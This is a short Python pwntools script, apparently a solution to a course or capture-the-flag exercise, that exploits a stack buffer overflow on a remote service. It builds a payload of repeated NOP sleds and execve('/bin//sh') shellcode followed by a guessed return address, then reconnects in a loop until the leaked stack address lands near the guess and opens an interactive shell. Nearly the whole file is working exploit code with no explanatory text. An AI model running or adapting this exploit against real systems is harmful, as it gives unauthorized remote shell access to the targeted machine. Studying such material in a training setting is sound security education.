from pwn import *

# 16392 bytes to return address
NOP = b"\x90"
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
RandomAddress = 0xffb386d4
exploit_str = flat({0:NOP*1024, 1024:shellcode, })

buf = b''
buf += NOP*1024
buf += shellcode
buf += NOP*1024
buf += shellcode
buf += NOP*1024
buf += shellcode
buf += NOP*1024
buf += shellcode
buf += NOP*1024
buf += shellcode
buf += NOP*1024
buf += shellcode
buf += NOP*1024
buf += shellcode
buf += NOP*1024
buf += shellcode
buf += NOP*1024
buf += shellcode
buf += NOP*1024
buf += shellcode
buf += NOP*1024
buf += shellcode
buf += NOP*1024
buf += shellcode
buf += NOP*1024
buf += shellcode
buf += NOP*1024
buf += shellcode
buf += NOP*1024
buf += shellcode
buf += NOP*664
buf += shellcode

buf += p32(RandomAddress)

i=1
while True:
    p = remote('cs4401shell2.walls.ninja', 31375)
    p.sendline(buf)

    addr = p.recvline()
    addr = int(addr, 16)

    print("\n")
    print(i)
    print("\n")

    #log.info(hex(addr) + " = " + addr)
    #log.info(hex(RandomAddress) + " = " + RandomAddress)

    diff = addr - RandomAddress
    #log.info(addr + "-" + RandomAddress + "=" + diff)

    if((diff < 16400) & (diff > -16400)):
        p.interactive()

    i=i+1
